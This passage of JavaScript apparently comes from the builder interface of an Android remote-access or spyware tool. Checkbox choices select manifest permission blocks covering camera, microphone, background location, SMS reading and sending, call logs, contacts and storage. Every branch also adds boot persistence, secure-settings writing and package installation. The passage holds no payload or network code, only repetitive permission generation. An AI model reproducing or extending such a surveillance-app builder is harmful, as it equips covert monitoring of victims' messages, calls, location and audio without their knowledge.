            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }



        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>  `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
